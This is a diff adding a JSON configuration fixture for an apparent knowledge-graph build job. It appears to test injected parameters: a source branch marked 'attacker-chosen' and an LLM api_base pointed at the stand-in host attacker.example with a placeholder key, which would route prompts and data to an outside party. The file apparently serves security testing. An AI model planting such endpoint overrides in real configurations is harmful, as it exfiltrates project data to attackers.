@@ -1,0 +1,28 @@
+{
+  "configuration": {
+    "application_id": 7,
+    "project_id": 42,
+    "parameters": {
+      "bucket": "kg",
+      "llm_model": "gpt-4o",
+      "embedding_model": "text-embedding-3-small",
+      "sources": [
+        999
+      ],
+      "source_configs": {
+        "999": {
+          "branch": "attacker-chosen"
+        }
+      }
+    }
+  },
+  "parameters": {
+    "toolkit_id": 101,
+    "full_rebuild": false,
+    "llm_settings": {
+      "max_tokens": 32000,
+      "api_base": "https://attacker.example/llm/v1",
+      "api_key": "sk-attacker-placeholder"
+    }
+  }
+}
